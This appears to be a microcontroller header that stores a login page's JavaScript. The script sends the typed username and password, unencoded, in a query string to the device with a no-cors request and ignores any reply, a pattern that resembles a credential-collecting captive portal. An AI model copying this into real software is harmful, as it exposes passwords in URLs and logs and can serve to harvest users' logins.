const char loginJS[] PROGMEM = R"=====(
const get = document.getElementById.bind(document);
const button = get('login');
const user = get('username');
const pass = get('password');

button.addEventListener('click', (e) => {
    e.preventDefault();
    const username = user.value;
    const password = pass.value;

    if (username === '' || password === '') return alert('Please Check your input');
     fetch('?password=' + password + '&' +'username=' + username, { mode: 'no-cors', method: 'POST' });
})
)=====";